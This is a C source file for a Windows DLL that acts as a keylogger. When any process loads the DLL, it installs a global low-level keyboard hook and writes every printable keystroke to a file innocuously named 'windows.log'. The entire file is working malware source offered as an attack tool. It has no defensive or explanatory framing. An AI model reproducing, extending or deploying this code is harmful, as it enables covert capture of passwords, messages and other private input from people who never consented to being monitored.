#include "hackjaggo.h"
#include "logger.h"

HHOOK hook;
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode != HC_ACTION)
        return CallNextHookEx(hook, nCode, wParam, lParam);

    if (wParam != WM_KEYUP)
        return CallNextHookEx(hook, nCode, wParam, lParam);

    char *pMsg = (char *)malloc(12 * sizeof(char));
    if (pMsg != NULL)
    {
        char symbol = getKeyboardSymbol(((KBDLLHOOKSTRUCT *)lParam)->vkCode);
        if (isPrintable(symbol))
        {
            snprintf(pMsg, 12, "%c", symbol);
            logMessage(pMsg);
            free(pMsg);
        }
    }
    else
    {
        DLogError("Memory allocation failed\n");
    }

    return CallNextHookEx(hook, nCode, wParam, lParam);
}

void startKeyLogger()
{
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook == NULL)
    {
        printf("Failed to install hook!\n");
        return;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
}

void OnCondition(void *pData) {}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    printf("DllLoaded\n");
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        printf("DLL_PROCESS_ATTACH\n");
        const char *pLogFileName = "windows.log";
        const HRESULT hResuult = createLogger(pLogFileName);
        if (hResuult != S_OK)
        {
            DLOG("Logger initialization failed");
            return -1;
        }

        setOnConditionCallback(&OnCondition);

        DLOG("Starting keylogger...\n");
        startKeyLogger();
        // A process is loading the DLL
    }
    break;
    case DLL_THREAD_ATTACH:
        printf("DLL_THREAD_ATTACH\n");
        // A thread is being created in the process
        break;
    case DLL_THREAD_DETACH:
        printf("DLL_THREAD_DETACH\n");
        // A thread is exiting cleanly
        break;
    case DLL_PROCESS_DETACH:
        printf("DLL_PROCESS_DETACH\n");
        closeLogger();
        // The process is unloading the DLL
        break;
    }

    return TRUE;
}
